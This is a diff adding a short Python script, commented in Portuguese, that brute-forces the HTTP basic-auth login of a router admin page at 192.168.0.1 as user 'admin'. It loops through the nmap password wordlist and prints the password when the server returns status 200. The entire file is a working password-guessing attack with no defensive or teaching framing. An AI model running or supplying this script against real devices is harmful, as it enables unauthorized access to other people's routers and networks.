@@ -1,0 +1,18 @@
+#coding: UTF-8
+import requests
+###### Gregorio Honorato @greghono
+##### CRIA O CAMINHO PARA QUEBRAR A SENHA COM ARQUIVO
+hosts = "http://192.168.0.1"
+user = "admin"
+arq = open("/usr/share/wordlists/nmap.lst")
+linhas = arq.readlines()
+
+for tentativa in linhas:
+    tentativa = str(tentativa[:len(tentativa)-1])
+    load = (requests.get(hosts,auth=(user, tentativa)))
+    
+    if load.status_code == 200:
+        print('Senha e:',tentativa)
+        break
+    else:
+        print("A senha nao e:",tentativa)
